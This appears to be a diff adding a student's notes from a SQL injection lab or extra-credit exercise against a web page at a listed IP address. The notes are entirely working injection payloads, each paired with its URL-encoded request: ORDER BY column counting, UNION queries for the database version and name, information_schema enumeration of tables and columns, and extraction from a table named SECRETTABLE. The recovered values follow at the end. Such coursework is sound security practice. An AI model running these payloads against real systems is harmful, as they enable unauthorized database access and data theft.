@@ -1,0 +1,30 @@
+10' or 1=1 ORDER BY 1 #
+http://54.159.156.104/sqlinject3/?id=10%27+or+1%3D1+ORDER+BY+1+%23
+10' or 1=1 ORDER BY 2 #
+http://54.159.156.104/sqlinject3/?id=10%27+or+1%3D1+ORDER+BY+2+%23
+10' or 1=1 ORDER BY 3 #
+http://54.159.156.104/sqlinject3/?id=10%27+or+1%3D1+ORDER+BY+3+%23
+10' or 1=1 ORDER BY 4 # 
+http://54.159.156.104/sqlinject3/?id=10%27+or+1%3D1+ORDER+BY+4+%23
+
+10' UNION select 1,@@version,database() #
+or:-> ' UNION select 1,@@version,database() #
+http://54.159.156.104/sqlinject3/?id=10%27+UNION+select+1%2C%40%40version%2Cdatabase%28%29+%23
+
+' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #
+
+http://54.159.156.104/sqlinject3/?id=+%27+union+select+1%2Cgroup_concat%28table_name%29%2C3+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+%23
+
+
+' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() #
+http://54.159.156.104/sqlinject3/?id=%27+union+select+1%2Cgroup_concat%28column_name%29%2C3+from+information_schema.columns+where+table_schema%3Ddatabase%28%29+%23
+
+
+' union select secret,id,message from SECRETTABLE natural join foo #
+http://54.159.156.104/sqlinject3/?id=++%27+union+select+secret%2Cid%2Cmessage+from+SECRETTABLE+natural+join+foo+%23
+
+
+Name: proj2_xtra_cr3dit
+Version: 5.5.50-0ubuntu0.14.04.1
+Tables: SECRETTABLE,foo,inject3_users
+Secret string: Nothing to see here, move along
